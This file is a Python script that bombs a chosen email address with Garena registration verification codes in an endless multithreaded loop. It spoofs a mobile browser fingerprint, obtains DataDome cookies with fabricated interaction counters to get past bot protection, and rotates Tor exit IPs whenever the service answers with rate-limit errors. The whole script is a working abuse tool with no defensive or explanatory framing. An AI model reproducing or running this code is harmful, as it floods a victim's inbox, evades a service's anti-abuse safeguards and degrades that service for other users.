import requests
import time
import json
import urllib3
import threading
import random
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore')

urllib3.disable_warnings()

email = input("Email: ").strip()
threads = int(input("Threads (1-10): ") or "5")
use_tor = input("Use Tor? (y/n): ").lower() == 'y'

checked = 0
lock = threading.Lock()
tor_started = False
last_request_time = 0
request_lock = threading.Lock()
tor_process = None
running = True
success_count = 0
fail_count = 0

_F = {
    "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
    "screen": "393 * 873",
    "viewport": "392 * 783",
    "pixel_ratio": 2.75,
    "os": "android",
    "browser": "android 10"
}

_H = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
    "User-Agent": _F["user_agent"],
    "Referer": "https://sso.garena.com/universal/register?locale=en-US",
    "Origin": "https://sso.garena.com",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Connection": "close"
}

def start_tor_termux():
    global tor_started, tor_process
    try:
        print("Starting Tor...")
        tor_process = subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        tor_started = True
        print("Tor started")
        return True
    except Exception as e:
        print(f"Tor start error: {e}")
        return False

def check_tor():
    try:
        test_session = requests.Session()
        test_session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        test_session.verify = False
        test_session.timeout = 5
        r = test_session.get('https://check.torproject.org/', timeout=5)
        return r.status_code == 200
    except:
        return False

def rotate_tor_ip():
    try:
        import stem
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("IP rotated")
        time.sleep(1)
        return True
    except:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(('127.0.0.1', 9051))
            s.send(b'AUTHENTICATE ""\r\n')
            s.send(b'SIGNAL NEWNYM\r\n')
            s.send(b'QUIT\r\n')
            s.close()
            print("IP rotated")
            time.sleep(1)
            return True
        except:
            try:
                subprocess.run(['pkill', '-HUP', 'tor'], capture_output=True)
                time.sleep(1)
                print("IP rotated")
                return True
            except:
                return False

if use_tor:
    if start_tor_termux():
        time.sleep(2)
        if not check_tor():
            print("Tor not responding, but continuing...")
    else:
        print("Tor failed, continuing without Tor")
        use_tor = False

def get_session():
    session = requests.Session()
    if use_tor and tor_started:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    session.verify = False
    session.timeout = 10
    session.headers.update({
        'Connection': 'close'
    })
    return session

def get_datadome():
    url = "https://datadome.garena.com/js/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://sso.garena.com/universal/register?locale=en-SG",
        "Connection": "close"
    }
    payload = {
        "jsType": "le",
        "eventCounters": '{"mousemove":1,"click":1,"keydown":11}',
        "ddk": "AE3F04AD3F0D3A462481A337485081",
        "Referer": "https://sso.garena.com/universal/register?locale=en-SG",
        "request": "/universal/register?locale=en-SG",
        "responsePage": "origin",
        "ddv": "5.7.0"
    }
    try:
        session = get_session()
        r = session.post(url, headers=headers, data=payload, timeout=15)
        result = r.json()
        if result.get('status') == 200:
            cookie_string = result.get('cookie', '')
            if 'datadome=' in cookie_string:
                for part in cookie_string.split(';'):
                    if 'datadome=' in part:
                        return part.replace('datadome=', '').strip()
        return None
    except:
        return None

def build_headers(token):
    headers = _H.copy()
    headers["Cookie"] = f"datadome={token}"
    return headers

def send_otp(thread_id):
    global checked, success_count, fail_count, running, last_request_time
    if not running:
        return False
    
    if use_tor and thread_id % 2 == 0:
        rotate_tor_ip()
    
    try:
        with request_lock:
            current = time.time()
            elapsed = current - last_request_time
            if elapsed < 0.1:
                time.sleep(0.1 - elapsed)
            last_request_time = time.time()
        
        token = get_datadome()
        if not token:
            with lock:
                fail_count += 1
                checked += 1
                print(f"[{checked}] Thread-{thread_id} | Failed to get datadome")
            return False
        
        headers = build_headers(token)
        payload = {
            "username": "VaixSsootpx",
            "email": email,
            "locale": "en-US",
            "format": "json",
            "id": str(int(time.time() * 1000))
        }
        
        session = get_session()
        response = session.post(
            "https://sso.garena.com/api/send_register_code_email",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        with lock:
            checked += 1
            print(f"[{checked}] Thread-{thread_id} | Status: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('status') == 'ok':
                    print("OTP Sent")
                    with lock:
                        success_count += 1
                    return True
                else:
                    with lock:
                        fail_count += 1
            except:
                with lock:
                    fail_count += 1
        elif response.status_code in [403, 429]:
            print("Rate limit, rotating IP...")
            if use_tor:
                rotate_tor_ip()
            with lock:
                fail_count += 1
        else:
            with lock:
                fail_count += 1
        session.close()
        return False
    except Exception as e:
        print(f"Error: {str(e)[:50]}")
        if use_tor:
            rotate_tor_ip()
        with lock:
            fail_count += 1
        return False

print(f"\nSending OTPs to {email}")
print(f"Tor: {'Enabled' if use_tor else 'Disabled'}")
print(f"Threads: {threads}")
print("Press Ctrl+C to stop")
print("="*60)

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = []
    while running:
        for i in range(threads):
            if not running:
                break
            futures.append(executor.submit(send_otp, i))
            time.sleep(0.05)
        
        for future in futures:
            if not running:
                break
            try:
                future.result(timeout=30)
            except:
                pass
        
        if checked % 10 == 0:
            print(f"Sent: {checked} | Success: {success_count} | Failed: {fail_count}")

if tor_process:
    tor_process.terminate()